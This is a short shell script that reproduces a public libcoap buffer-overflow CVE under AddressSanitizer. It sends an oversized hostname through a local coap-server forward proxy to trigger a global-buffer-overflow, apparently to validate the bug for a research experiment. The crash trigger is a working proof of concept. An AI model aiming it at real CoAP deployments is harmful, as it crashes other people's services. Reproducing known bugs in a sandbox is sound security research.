#!/bin/sh
# Reproduce the known, public CVE-2025-34468 (libcoap v4.3.5, commit 7cf7465)
# inside the ASan sandbox to capture a sanitizer report for the Stage 2 C2
# (crash-given) experimental condition. This is CVE rediscovery/validation per
# the project SOW -- not zero-day work. Mechanism is entirely stock binaries:
#   - coap-server runs as a generic forward proxy (-P,)
#   - stock coap-client is pointed at that proxy (-P coap://127.0.0.1:5683)
#     and forwards a request whose target host is longer than the server's
#     fixed 256-byte addrstr buffer in coap_resolve_address_info().
# The server copies the host with an unchecked memcpy -> ASan reports a
# global-buffer-overflow write and the process exits. We capture that report.
set -u

SERVER_LOG=/tmp/server_asan.log
# A long hostname label (structurally a normal DNS name, just oversized).
LONGHOST=$(printf 'a%.0s' $(seq 1 300))

# ASan: print the report and exit non-zero; no leak noise.
export ASAN_OPTIONS="detect_leaks=0:abort_on_error=0:exitcode=1"

# Start a forward-proxy-enabled server.  -P ,thisserver  means:
#   - no next-hop proxy (direct connection to the target)
#   - server is known as "thisserver"
# An incoming proxy request whose target host does NOT match "thisserver"
# forces the server to resolve the target directly, reaching
# coap_resolve_address_info() with the oversized host.
./coap-server -A 127.0.0.1 -p 5683 "-P,thisserver" -v 5 >"$SERVER_LOG" 2>&1 &
SERVER_PID=$!
sleep 1

# Forward one GET through the proxy to the oversized target host.
./coap-client -m get -B 5 -P coap://127.0.0.1:5683 "coap://${LONGHOST}/" >/dev/null 2>&1 || true
sleep 1

# Stop the server if it is somehow still alive, then emit what it logged.
kill "$SERVER_PID" 2>/dev/null || true
wait "$SERVER_PID" 2>/dev/null || true

echo "===== captured coap-server output ====="
cat "$SERVER_LOG"
